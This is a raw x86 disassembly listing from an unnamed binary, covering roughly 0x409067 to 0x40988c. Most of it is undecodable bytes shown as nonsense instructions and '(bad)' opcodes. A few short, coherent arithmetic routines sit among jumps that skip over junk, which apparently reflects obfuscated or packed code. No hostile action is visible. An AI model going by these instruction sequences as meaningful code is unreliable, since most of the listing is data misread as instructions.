  409067:	inc    eax
  409068:	in     al,dx
  409069:	stos   BYTE PTR es:[edi],al
  40906a:	xor    BYTE PTR [edi],dl
  40906c:	out    dx,eax
  40906d:	xor    bl,BYTE PTR [ecx+0x35]
  409070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409071:	into   
  409072:	pop    ebp
  409073:	sbb    al,0x78
  409075:	ins    DWORD PTR es:[edi],dx
  409076:	sub    cl,BYTE PTR [ebp+0x4f5d2ff0]
  40907c:	inc    DWORD PTR ds:0x256a9460
  409082:	jmp    0x409082
  409084:	sub    DWORD PTR ds:0x68c915b9,0xb242bbec
  40908e:	xchg   esi,eax
  40908f:	(bad)  [ecx+ebx*8]
  409092:	fld    DWORD PTR [edi+edi*4-0x74]
  409096:	popa   
  409097:	sbb    eax,0x319bd614
  40909c:	sbb    bh,BYTE PTR ds:0x79716d80
  4090a2:	std    
  4090a3:	xchg   edi,eax
  4090a4:	add    eax,ebx
  4090a6:	cmp    DWORD PTR [ebp-0x17],ecx
  4090a9:	(bad)  
  4090aa:	shr    BYTE PTR [ebx-0x57b49cdb],0x78
  4090b1:	stc    
  4090b2:	pop    eax
  4090b3:	lds    esi,FWORD PTR ds:0x2b74c322
  4090b9:	mov    esi,0x30b87c1
  4090be:	ret    
  4090bf:	jb     0x409042
  4090c1:	out    0xb9,al
  4090c3:	jno    0x40910a
  4090c5:	dec    eax
  4090c6:	mov    ecx,0x8aa708e6
  4090cb:	lods   eax,DWORD PTR ds:[esi]
  4090cc:	test   BYTE PTR [ebx+0x62],0x1a
  4090d0:	xor    BYTE PTR [ebx],bh
  4090d2:	lock mov DWORD PTR ds:0x42aa61,0x7b75
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x36a4c6c4
  4090f5:	mov    ecx,0xef8e1c28
  4090fa:	js     0x409174
  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x4090a7
  409101:	sbb    DWORD PTR [esi+0x61e253c],esi
  409107:	and    ebp,ecx
  409109:	js     0x409140
  40910b:	mov    dl,0x3a
  40910d:	hlt    
  40910e:	pop    edx
  40910f:	xor    DWORD PTR [ebx+0x48],esi
  409112:	inc    ecx
  409113:	aad    0x9a
  409115:	fmul   st(6),st
  409117:	mov    cl,0x8a
  409119:	rcr    DWORD PTR [edx-0x4c7b073b],cl
  40911f:	push   eax
  409120:	scas   al,BYTE PTR es:[edi]
  409121:	inc    esi
  409122:	lods   al,BYTE PTR ds:[esi]
  409123:	outs   dx,BYTE PTR ds:[esi]
  409124:	dec    ecx
  409125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409126:	call   0xcda6:0xc3d3976d
  40912d:	xor    ebx,ebx
  40912f:	push   ss
  409130:	sbb    DWORD PTR [ecx-0x138cfccc],esp
  409136:	cmp    ah,0x1d
  409139:	add    dl,BYTE PTR [edx+0xa]
  40913c:	push   eax
  40913d:	cmc    
  40913e:	mov    al,ds:0x6cd3cdf0
  409143:	test   BYTE PTR [esp+ecx*4-0x16],al
  409147:	into   
  409148:	jmp    0x1874fd18
  40914d:	call   0x94c2:0xbff87587
  409154:	and    eax,0x74e2a30
  409159:	and    bl,BYTE PTR [ebx+0x634b8e9c]
  40915f:	cmp    BYTE PTR [ecx+ecx*8],bh
  409162:	adc    eax,0x412513fa
  409167:	into   
  409168:	test   eax,0x8ce0fc63
  40916d:	mov    bl,0xc4
  40916f:	inc    edx
  409170:	and    eax,0xfe63e4bb
  409175:	sbb    dl,BYTE PTR [eax+0x6f]
  409178:	sbb    esi,DWORD PTR [eax+ebp*2+0x15]
  40917c:	mov    edi,0xdd5438e0
  409181:	and    ch,BYTE PTR [eax+0x4c]
  409184:	dec    edx
  409185:	cli    
  409186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409187:	mov    bl,0x65
  409189:	icebp  
  40918a:	mov    eax,ds:0x6ba17901
  40918f:	push   edi
  409190:	enter  0xeb60,0x4b
  409194:	adc    bl,BYTE PTR [ebx+0x726a69b3]
  40919a:	push   ecx
  40919b:	push   eax
  40919c:	jno    0x4091cf
  40919e:	sub    BYTE PTR [edi+0x6b],0x12
  4091a2:	pusha  
  4091a3:	cmp    BYTE PTR [edx-0x7b],dh
  4091a6:	popf   
  4091a7:	add    DWORD PTR [ecx+0x75428fda],edi
  4091ad:	or     eax,0xead69b0a
  4091b2:	sbb    ebp,eax
  4091b4:	js     0x4091c2
  4091b6:	mov    al,ds:0xe912258c
  4091bb:	je     0x409218
  4091bd:	xor    BYTE PTR [esi],bl
  4091bf:	mov    ds:0xe48a995,eax
  4091c4:	xchg   eax,eax
  4091c6:	jp     0x4091da
  4091c8:	mov    edi,0x727fa8b0
  4091cd:	pop    ebp
  4091ce:	and    edi,edi
  4091d0:	pop    es
  4091d1:	adc    DWORD PTR [ebp+edi*2+0x435e5823],0xffffffec
  4091d9:	test   eax,0x92b985ac
  4091de:	and    al,ch
  4091e0:	loopne 0x409235
  4091e2:	pop    ebx
  4091e3:	push   es
  4091e4:	inc    esp
  4091e5:	cdq    
  4091e6:	aaa    
  4091e7:	cli    
  4091e8:	retf   
  4091e9:	lds    esp,FWORD PTR [edi+ebp*8+0x6b]
  4091ed:	retf   0x4b25
  4091f0:	ret    0xcd01
  4091f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091f4:	pop    edi
  4091f5:	jge    0x40917f
  4091f7:	mov    esp,0xa8f49e54
  4091fc:	lods   al,BYTE PTR ds:[esi]
  4091fd:	dec    eax
  4091fe:	rcr    DWORD PTR [edx],cl
  409200:	push   esp
  409201:	mov    esp,0x55ceabce
  409206:	bound  ebx,QWORD PTR [edi+0x40ed079]
  40920c:	ds pop edx
  40920e:	xor    eax,0x2d718270
  409213:	addr16 test al,0xb3
  409216:	or     eax,0xc0ebeb05
  40921b:	inc    esp
  40921c:	sub    edi,ebx
  40921e:	vaddss xmm0,xmm5,DWORD PTR [esi-0x385a3c82]
  409226:	jmpw   0xc46e
  40922a:	adc    ebp,esp
  40922c:	loope  0x4091ca
  40922e:	cmp    dl,0xea
  409231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409232:	and    al,0x99
  409234:	sbb    al,0x88
  409236:	and    DWORD PTR [eax-0x47],edx
  409239:	arpl   WORD PTR [eax-0x40b2b8e3],sp
  40923f:	ss hlt 
  409241:	or     edx,esp
  409243:	xor    esp,DWORD PTR ds:0x6233e4c0
  409249:	dec    ebp
  40924a:	lea    edi,[ebx+eiz*8+0x7da3904d]
  409251:	fisubr DWORD PTR [ecx]
  409253:	cwde   
  409254:	and    dl,BYTE PTR [eax]
  409256:	shl    esi,0x7
  409259:	jp     0x4092a3
  40925b:	add    esp,ebp
  40925d:	inc    ebx
  40925e:	mov    edi,DWORD PTR ds:0x44895794
  409264:	pop    ebp
  409265:	call   0xbcf6783d
  40926a:	(bad)  
  40926b:	xor    eax,0x6e0e642
  409270:	jno    0x409286
  409272:	xor    esi,DWORD PTR [edi+ebx*8]
  409275:	mov    al,ds:0xbc7391b6
  40927a:	ja     0x409203
  40927c:	test   BYTE PTR [edx],0xe5
  40927f:	mov    dl,0xfb
  409281:	bound  eax,QWORD PTR [esi+0x67]
  409284:	jmp    0x4493972f
  409289:	popf   
  40928a:	adc    al,0x61
  40928c:	aaa    
  40928d:	int3   
  40928e:	dec    edi
  40928f:	mov    bl,0xee
  409291:	or     al,0x49
  409293:	clc    
  409294:	lahf   
  409295:	xchg   esi,eax
  409296:	ror    DWORD PTR [edi+0x29],1
  409299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40929a:	lods   al,BYTE PTR ds:[esi]
  40929b:	sub    esp,DWORD PTR [edi+eiz*4]
  40929e:	pop    ds
  40929f:	jmp    0x4092ed
  4092a1:	adc    DWORD PTR [edx],eax
  4092a3:	cld    
  4092a4:	xor    BYTE PTR [ebx+eax*8+0x52fc1b54],bl
  4092ab:	stos   DWORD PTR es:[edi],eax
  4092ac:	repz jmpw 0x3457
  4092b1:	mov    dl,0xf
  4092b3:	and    ebp,DWORD PTR [edi+eiz*4]
  4092b6:	mov    edx,0x826c59af
  4092bb:	mov    WORD PTR [ebx-0x203c5ddd],ss
  4092c1:	pop    ss
  4092c2:	scas   eax,DWORD PTR es:[edi]
  4092c3:	ret    0x17ca
  4092c6:	add    BYTE PTR [esi+0x5459a4b4],al
  4092cc:	jmp    0xa2f:0x40f7af89
  4092d3:	jmp    0x6116:0x5647394d
  4092da:	xchg   ebp,eax
  4092db:	retf   0x27b
  4092de:	iret   
  4092df:	call   0xfb20:0xb817e069
  4092e6:	push   0x214ca5a5
  4092eb:	mov    esi,0xfc00d19e
  4092f0:	cli    
  4092f1:	add    al,0x28
  4092f3:	ins    DWORD PTR es:[edi],dx
  4092f4:	clc    
  4092f5:	mov    bl,0x24
  4092f7:	mov    edi,0x27757a1a
  4092fc:	pop    edi
  4092fd:	push   ds
  4092fe:	cmp    DWORD PTR [ecx],edi
  409300:	cmp    eax,0xe92197bd
  409305:	in     al,0x44
  409307:	enter  0xaf2e,0x10
  40930b:	xor    ebp,DWORD PTR [esi*1+0x499afe6a]
  409312:	pop    esi
  409313:	mov    DWORD PTR [eax],ecx
  409315:	test   eax,0x1c415b14
  40931a:	cmc    
  40931b:	mov    al,0xe4
  40931d:	mov    bl,0x2d
  40931f:	mov    dl,0xf9
  409321:	push   esi
  409322:	inc    edx
  409323:	pop    ecx
  409324:	sbb    ebp,DWORD PTR [edx]
  409326:	sbb    DWORD PTR [eax+ebx*2+0x76],ebx
  40932a:	mov    eax,0x7f0ad3e5
  40932f:	add    eax,0x313957cd
  409334:	push   ds
  409335:	icebp  
  409336:	fldcw  WORD PTR [eax-0x4d3df7a2]
  40933c:	pop    esp
  40933d:	adc    BYTE PTR [ecx],0xc2
  409340:	in     eax,dx
  409341:	loopne 0x4092c7
  409343:	leave  
  409344:	push   esp
  409345:	sbb    eax,ecx
  409347:	mov    ds:0x9bd9a712,al
  40934d:	dec    ecx
  40934e:	stc    
  40934f:	(bad)  
  409350:	ins    DWORD PTR es:[edi],dx
  409351:	fiadd  DWORD PTR [edi+0x3d8fd596]
  409357:	pop    DWORD PTR [eax-0x6aa591fd]
  40935d:	sahf   
  40935e:	(bad)  
  409360:	addr16 cmc 
  409362:	mov    bl,0xa8
  409364:	add    esp,DWORD PTR [edx+edi*2+0x61030bc1]
  40936b:	mov    cl,0x8
  40936d:	and    al,0x49
  40936f:	(bad)  
  409370:	loope  0x4093d2
  409372:	inc    edx
  409373:	add    BYTE PTR [eax-0x59344a95],dl
  409379:	popf   
  40937a:	js     0x409301
  40937c:	data16 or ah,BYTE PTR [esi+edi*8]
  409380:	imul   DWORD PTR [eax+0x394e177a]
  409386:	int    0x11
  409388:	loop   0x4093a7
  40938a:	fidivr DWORD PTR [eax-0x4e]
  40938d:	sbb    al,0x89
  40938f:	inc    edx
  409390:	jbe    0x409340
  409392:	clc    
  409393:	pusha  
  409394:	out    0xcb,al
  409396:	sbb    esi,esi
  409398:	add    eax,0x498bc03d
  40939d:	call   0xf783:0xe9f34b0d
  4093a4:	sub    DWORD PTR [ecx+0x1e],0x458b201c
  4093ab:	cld    
  4093ac:	add    DWORD PTR ds:0x42aa19,0x42a9c9
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0xbb06ff3d
  4093fb:	jmp    0x409411
  4093fd:	xor    eax,0xa77878ec
  409402:	jle    0x40947c
  409404:	js     0x4093f4
  409406:	shl    DWORD PTR [edi+ebx*8-0x29],1
  40940a:	or     bl,BYTE PTR [esp+edi*4+0xa689196]
  409411:	mov    cl,0x75
  409413:	div    bh
  409415:	mov    al,0xb6
  409417:	rol    BYTE PTR [ebx-0xe],1
  40941a:	pop    ds
  40941b:	in     al,dx
  40941c:	inc    ecx
  40941d:	outs   dx,DWORD PTR ds:[esi]
  40941e:	test   eax,0xebf3b55c
  409423:	cmp    DWORD PTR es:[eax],edx
  409426:	mov    eax,0x2f02e097
  40942b:	pop    ecx
  40942c:	and    al,0xe2
  40942e:	(bad)  
  40942f:	pop    esi
  409430:	lods   al,BYTE PTR ds:[esi]
  409431:	mov    cl,0x4
  409433:	dec    BYTE PTR [ecx]
  409435:	loop   0x4093be
  409437:	mov    bh,0x81
  409439:	test   al,0xe0
  40943b:	into   
  40943c:	jge    0x409487
  40943e:	cmp    BYTE PTR [edx+0x56a5e4b8],dl
  409444:	push   esp
  409445:	sub    edx,DWORD PTR [ebx-0x25]
  409448:	or     al,0xf2
  40944a:	sub    DWORD PTR es:[ebp-0x66],edi
  40944e:	pop    es
  40944f:	je     0x409424
  409451:	(bad)  
  409452:	lods   eax,DWORD PTR ds:[esi]
  409453:	fisttp QWORD PTR [edx]
  409455:	mov    al,ds:0x739b5e25
  40945a:	mov    ch,0x75
  40945d:	call   0x448a634f
  409462:	inc    ecx
  409463:	stos   DWORD PTR es:[edi],eax
  409464:	mov    DWORD PTR ds:0x8f57580,eax
  40946a:	push   ds
  40946b:	push   es
  40946c:	sbb    DWORD PTR [eax+ecx*2+0x2c9b80a4],esp
  409473:	loope  0x4094f2
  409475:	mov    al,0xd7
  409477:	xor    esp,DWORD PTR [edi+edi*4-0x15c8483b]
  40947e:	pop    esi
  40947f:	jo     0x4094c0
  409481:	rol    BYTE PTR [ecx+eax*8+0x73c1e111],1
  409488:	jo     0x409497
  40948a:	mov    al,0x26
  40948c:	shl    DWORD PTR [ebp+0x4c267e81],0xe8
  409493:	ins    DWORD PTR es:[edi],dx
  409494:	(bad)  
  409495:	xchg   edi,eax
  409496:	retf   
  409497:	pop    edi
  409498:	mov    ebp,0xc9e4dcc2
  40949d:	pop    es
  40949e:	xchg   ecx,eax
  40949f:	(bad)  
  4094a0:	xor    edi,ebp
  4094a2:	cwde   
  4094a3:	mov    al,ds:0xcc7b6672
  4094a8:	xor    DWORD PTR [ebp+eiz*4-0x5e41dd2a],eax
  4094af:	and    ch,al
  4094b1:	outs   dx,BYTE PTR ds:[esi]
  4094b2:	(bad)  
  4094b3:	lock pushf 
  4094b5:	mov    ebp,0xe836b2b
  4094ba:	xchg   ecx,eax
  4094bb:	sbb    eax,0x2d6a63bf
  4094c0:	add    eax,DWORD PTR [edi+0x28]
  4094c3:	(bad)  
  4094c4:	jle    0x409509
  4094c6:	adc    eax,ecx
  4094c8:	add    BYTE PTR [esi],bl
  4094ca:	add    bh,BYTE PTR [ecx]
  4094cc:	push   cs
  4094cd:	es ret 0xd86b
  4094d1:	or     edx,DWORD PTR [esi-0x80]
  4094d4:	in     eax,0x95
  4094d6:	pop    edx
  4094d7:	mov    edx,0xbeb859f2
  4094dc:	and    BYTE PTR [edi+0x72],bh
  4094df:	cmp    ch,dl
  4094e1:	fist   WORD PTR [esi+0x498885e1]
  4094e7:	das    
  4094e8:	stos   DWORD PTR es:[edi],eax
  4094e9:	mov    eax,edi
  4094eb:	or     BYTE PTR [esi],bl
  4094ed:	js     0x409501
  4094ef:	push   ebp
  4094f0:	imul   eax,DWORD PTR [ebp-0x7],0xcdccf6b0
  4094f7:	sbb    DWORD PTR [esi-0x45b68ff],0x316eb115
  409501:	sub    eax,DWORD PTR [edx]
  409503:	add    bh,BYTE PTR [ebx]
  409505:	es pop ebx
  409507:	(bad)  
  409508:	lahf   
  409509:	test   al,0x40
  40950b:	pop    ebp
  40950c:	mov    al,0xc4
  40950e:	in     al,0x56
  409510:	sahf   
  409511:	(bad)  
  409512:	xor    al,0x57
  409514:	xchg   BYTE PTR [ebp-0x2ef1203e],bh
  40951a:	dec    esp
  40951b:	push   ecx
  40951c:	aad    0xed
  40951e:	cmp    ah,cl
  409520:	push   es
  409521:	sbb    bl,BYTE PTR [ecx+ecx*1-0x8]
  409525:	add    BYTE PTR [ebx+0x3e27d830],dh
  40952b:	stos   DWORD PTR es:[edi],eax
  40952c:	gs pop ebx
  40952e:	adc    BYTE PTR [esi],al
  409530:	data16 mov al,0xaf
  409533:	pop    esp
  409534:	cmp    BYTE PTR [ebp+0x6bfb0a4b],al
  40953a:	mov    bh,0x79
  40953c:	fucomi st,st(4)
  40953e:	xchg   edx,eax
  40953f:	and    eax,0xb64cb91e
  409544:	in     al,0xe1
  409546:	add    bl,BYTE PTR gs:[eax]
  409549:	jne    0x409555
  40954b:	inc    esp
  40954c:	cmp    ebp,DWORD PTR [ebp+0x1f]
  40954f:	jge    0x409536
  409551:	out    0xd3,eax
  409553:	out    0xf4,eax
  409555:	push   eax
  409556:	mov    cl,0x7f
  409558:	add    BYTE PTR [edi+eiz*4-0x26161930],ch
  40955f:	jmp    0x409581
  409561:	xor    ebp,DWORD PTR [edi]
  409563:	enter  0x8bb9,0x58
  409567:	push   cs
  409568:	cmp    BYTE PTR [eax-0x71c4cf0b],ch
  40956e:	inc    ebp
  40956f:	add    al,0x7d
  409571:	lods   eax,DWORD PTR ds:[esi]
  409572:	pcmpeqw mm5,QWORD PTR [eax+edx*4-0x47]
  409577:	(bad)  
  409578:	and    al,0x85
  40957a:	jne    0x4095e4
  40957c:	scas   eax,DWORD PTR es:[edi]
  40957d:	shl    DWORD PTR [edi],cl
  40957f:	int    0x96
  409581:	test   BYTE PTR [ebx+0x261acfec],bh
  409587:	(bad)  
  409588:	fdivr  QWORD PTR [esi-0x66]
  40958b:	or     DWORD PTR [edi-0x61a6854f],esi
  409591:	xor    DWORD PTR [ecx+0x11],ebx
  409594:	stc    
  409595:	dec    ecx
  409596:	cs (bad) 
  409598:	adc    esi,DWORD PTR [eax-0x1e]
  40959b:	ins    DWORD PTR es:[edi],dx
  40959c:	inc    esi
  40959d:	enter  0x6fdc,0x8d
  4095a1:	imul   ecx,DWORD PTR [edi+0x4ac5f594],0xffffff83
  4095a8:	je     0x40953b
  4095aa:	lods   al,BYTE PTR cs:[esi]
  4095ac:	adc    al,0x30
  4095ae:	stc    
  4095af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095b0:	xchg   ebx,eax
  4095b1:	adc    ch,BYTE PTR [esi]
  4095b3:	(bad)  
  4095b4:	retf   0x4516
  4095b7:	in     eax,0xbf
  4095b9:	out    dx,eax
  4095ba:	sub    DWORD PTR [esi],0xffffffaf
  4095bd:	sti    
  4095be:	fucom  st(5)
  4095c0:	sub    eax,0x126ceb6e
  4095c5:	shl    DWORD PTR [edi-0x7575d6ae],cl
  4095cb:	mov    ebx,0x461087ea
  4095d0:	sub    bh,dl
  4095d2:	(bad)  
  4095d3:	mov    dh,0xd8
  4095d5:	and    eax,0x8b9a4919
  4095da:	pushf  
  4095db:	aad    0x25
  4095dd:	mov    ecx,0xa38df707
  4095e2:	add    eax,0x2806aefd
  4095e7:	push   ds
  4095e8:	jl     0x4095a7
  4095ea:	xchg   ebx,eax
  4095eb:	sbb    eax,DWORD PTR [ebx-0x3e]
  4095ee:	fld    TBYTE PTR [ebx+ebx*8+0x74]
  4095f2:	daa    
  4095f3:	int    0x5d
  4095f5:	sub    DWORD PTR ds:0x53b4f26c,edi
  4095fb:	rcl    BYTE PTR [edx],1
  4095fd:	add    edx,eax
  4095ff:	mov    ebx,0xf5afc23e
  409604:	dec    edx
  409605:	test   al,0xce
  409607:	xchg   DWORD PTR [edi-0x6c],edi
  40960a:	(bad)  
  40960b:	lock jb 0x40962a
  40960e:	mov    eax,0x23cfcbb5
  409613:	fwait
  409614:	mov    dh,cl
  409616:	fist   WORD PTR [edi+eax*1+0x5e]
  40961a:	cmp    DWORD PTR [edx+edi*4],eax
  40961d:	shl    DWORD PTR [ebp+0x527bdc79],1
  409623:	dec    edi
  409624:	les    ecx,FWORD PTR [edi-0x36]
  409627:	or     DWORD PTR [eax-0x32],ebx
  40962a:	pushf  
  40962b:	sub    al,0x9b
  40962d:	sub    DWORD PTR [esi],esp
  40962f:	lea    ebp,[ecx-0x707548b0]
  409635:	fisttp DWORD PTR [eax-0x31]
  409638:	mov    BYTE PTR [edi-0x379e1cee],al
  40963e:	lods   eax,DWORD PTR ds:[esi]
  40963f:	icebp  
  409640:	adc    BYTE PTR [esi-0x49dce2cc],dh
  409646:	dec    BYTE PTR [edx]
  409648:	hlt    
  409649:	mov    ?,WORD PTR [eax+esi*8-0x78]
  40964d:	pop    ebx
  40964e:	nop
  40964f:	sub    al,0xf2
  409651:	adc    eax,0xc7870f7c
  409656:	ins    BYTE PTR es:[edi],dx
  409657:	outs   dx,BYTE PTR cs:[esi]
  409659:	sub    eax,0xefaea754
  40965e:	mov    eax,0xa16dca87
  409663:	lahf   
  409664:	sbb    al,0x2e
  409666:	ret    0xd556
  409669:	or     esp,esp
  40966b:	cmp    cl,BYTE PTR [esi]
  40966d:	jb     0x409617
  40966f:	push   cs
  409670:	ds jecxz 0x409640
  409673:	or     al,0x84
  409675:	sar    DWORD PTR [edx],1
  409677:	fst    QWORD PTR [eax]
  409679:	fild   DWORD PTR [edx+esi*2-0x38]
  40967d:	iret   
  40967e:	cmp    dh,BYTE PTR [eax-0xd482953]
  409684:	xor    eax,0xd3efbc4f
  409689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40968a:	rol    BYTE PTR [ecx+0x71],0x3
  40968e:	add    ebx,0x30
  409691:	ss xchg ecx,eax
  409693:	(bad)  
  409694:	jle    0x40968c
  409696:	jo     0x409630
  409698:	fstp   QWORD PTR [eax+0x15]
  40969b:	inc    esi
  40969c:	pop    edi
  40969d:	dec    eax
  40969e:	test   BYTE PTR [edi],ah
  4096a0:	dec    edi
  4096a1:	xchg   ebx,eax
  4096a2:	add    dh,0xcb
  4096a5:	adc    al,0xf4
  4096a7:	rcl    BYTE PTR [ecx-0x51b6d31a],1
  4096ad:	fisttp DWORD PTR [ebx-0x7bf003bb]
  4096b3:	cmc    
  4096b4:	cld    
  4096b5:	(bad)  
  4096b6:	push   DWORD PTR [ebx]
  4096b8:	ret    0xc103
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x53
  4096e4:	mov    DWORD PTR [edx+0x78f25c57],eax
  4096ea:	js     0x40973e
  4096ec:	jle    0x409766
  4096ee:	js     0x409712
  4096f0:	mov    al,0x92
  4096f2:	jp     0x40969e
  4096f4:	mov    edx,0x13f6abff
  4096f9:	adc    DWORD PTR ds:0xf031a8fd,ebx
  4096ff:	popf   
  409700:	fld    QWORD PTR [edx]
  409702:	fdiv   QWORD PTR [esi+edx*8+0x164b96fb]
  409709:	ds repnz dec esi
  40970c:	xchg   edx,eax
  40970d:	pop    eax
  40970e:	dec    edx
  40970f:	call   0xf5dc:0xdc5af5a1
  409716:	xchg   ebx,eax
  409717:	fidivr DWORD PTR [eax-0x63]
  40971a:	nop
  40971b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40971c:	es inc ebp
  40971e:	test   DWORD PTR [ecx+0x0],ebp
  409721:	and    eax,0x6523e6b6
  409726:	jp     0x4096c5
  409728:	adc    al,0x74
  40972a:	mov    ebp,0x8a38465d
  40972f:	cld    
  409730:	sbb    BYTE PTR [edx-0x38],bl
  409733:	adc    BYTE PTR [esi+edi*1-0x77],0x5f
  409738:	dec    ebp
  409739:	adc    DWORD PTR [ebx+0x397dd36d],eax
  40973f:	shl    BYTE PTR [edi+ebx*2+0x65b229d2],0xe5
  409747:	jne    0x4096df
  409749:	out    0x6c,al
  40974b:	not    DWORD PTR [edi-0x177eacca]
  409751:	call   0xe830:0x17ced169
  409758:	outs   dx,BYTE PTR ds:[esi]
  409759:	or     cl,al
  40975b:	mov    bh,0x42
  40975d:	(bad)  
  40975e:	mov    esi,0x9c03190f
  409763:	jmp    0x40972f
  409765:	add    esp,DWORD PTR [ebx+0x67df295e]
  40976b:	push   ecx
  40976c:	dec    edx
  40976d:	jo     0x4097ee
  40976f:	adc    edx,eax
  409771:	dec    eax
  409772:	jmp    0x409769
  409774:	jmp    0x1e43:0x71b912c1
  40977b:	clc    
  40977c:	sub    BYTE PTR [ecx],bl
  40977e:	mov    ecx,DWORD PTR [edi]
  409780:	repz adc al,0x53
  409783:	xlat   BYTE PTR ds:[ebx]
  409784:	adc    eax,0x12ed07f
  409789:	xchg   esp,eax
  40978a:	int3   
  40978b:	fucomp st(5)
  40978d:	push   ebp
  40978e:	xor    DWORD PTR [edx],0xe0fe6db8
  409794:	pop    ecx
  409795:	into   
  409796:	inc    edx
  409797:	call   0xb1e31e43
  40979c:	fwait
  40979d:	iret   
  40979e:	adc    ebx,ecx
  4097a0:	push   ecx
  4097a1:	mov    dh,0xe7
  4097a3:	cdq    
  4097a4:	inc    esi
  4097a5:	out    0x66,al
  4097a7:	call   0x1390b196
  4097ac:	test   al,0xec
  4097ae:	pop    eax
  4097af:	fsubp  st(0),st
  4097b1:	das    
  4097b2:	pop    es
  4097b3:	sub    esp,esp
  4097b5:	adc    al,0x74
  4097b7:	dec    esp
  4097b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097b9:	fsubr  st(4),st
  4097bb:	xchg   esp,eax
  4097bc:	sbb    al,0xe1
  4097be:	mov    esi,0x47fe59af
  4097c3:	test   al,0x34
  4097c5:	ins    BYTE PTR es:[edi],dx
  4097c6:	jnp    0x409782
  4097c8:	enter  0x6d4,0xb
  4097cc:	push   ecx
  4097cd:	daa    
  4097ce:	sub    edx,DWORD PTR [edi]
  4097d0:	loopne 0x4097cd
  4097d2:	das    
  4097d3:	loop   0x4097b0
  4097d5:	mul    DWORD PTR [esi+0x7ff4a63e]
  4097db:	scas   eax,DWORD PTR es:[edi]
  4097dc:	rcr    ah,1
  4097de:	adc    DWORD PTR [ebx+0x3b],edx
  4097e1:	xor    al,dh
  4097e3:	cs jge 0x4097f8
  4097e6:	mov    esp,0x985d77c5
  4097eb:	and    BYTE PTR [eax-0x79],ah
  4097ee:	cmp    al,0x5d
  4097f0:	xchg   DWORD PTR [eax],edx
  4097f2:	test   DWORD PTR [ecx-0x4e],ecx
  4097f5:	push   0x5c
  4097f7:	push   ds
  4097f8:	push   ebp
  4097f9:	(bad)  
  4097fa:	jl     0x409847
  4097fc:	(bad)  
  4097fe:	cli    
  4097ff:	pop    ebp
  409800:	push   ecx
  409801:	es int 0x50
  409804:	js     0x4097e9
  409806:	fdivr  DWORD PTR [esi-0x67]
  409809:	aaa    
  40980a:	pop    esi
  40980b:	call   0xe771689a
  409810:	dec    ecx
  409811:	ficom  DWORD PTR [edi+edi*4+0x4e]
  409815:	pusha  
  409816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409817:	int3   
  409818:	lahf   
  409819:	cdq    
  40981a:	(bad)  [eax-0x3a]
  40981d:	add    dl,BYTE PTR [ebx-0x73]
  409820:	jmp    0xbd3e:0x86eccbb
  409827:	jle    0x409856
  409829:	jg     0x409899
  40982b:	cdq    
  40982c:	mov    dh,0xd1
  40982e:	add    al,BYTE PTR [ecx-0x7839eade]
  409834:	(bad)  
  409835:	out    dx,eax
  409836:	dec    esp
  409837:	repnz inc edx
  409839:	or     DWORD PTR [ecx-0x353cca04],0x7a2082d2
  409843:	adc    eax,0xf4ac228
  409848:	sbb    al,BYTE PTR ds:0x431c2858
  40984e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40984f:	mov    esp,0x548118e8
  409854:	cli    
  409855:	jmp    0xdcd4656b
  40985a:	mov    dh,0x19
  40985c:	(bad)  
  40985d:	(bad)
  409860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409861:	xor    eax,0x77193182
  409866:	or     eax,0x7545679d
  40986b:	mov    edi,0xddd5645
  409870:	fcom   QWORD PTR [esi+0x8]
  409873:	inc    edx
  409874:	and    ebx,DWORD PTR [edi+0x38]
  409877:	pusha  
  409878:	mov    ch,BYTE PTR [edx-0x3d]
  40987b:	ins    DWORD PTR es:[edi],dx
  40987c:	hlt    
  40987d:	jecxz  0x4098ec
  40987f:	add    BYTE PTR [edi+0x6dc22b1],dl
  409885:	sub    al,0xbd
  409887:	mov    bl,0x57
  409889:	jne    0x4098fe
  40988b:	inc    edi
  40988c:	mov    BYTE PTR [esi+0xe228561],dl
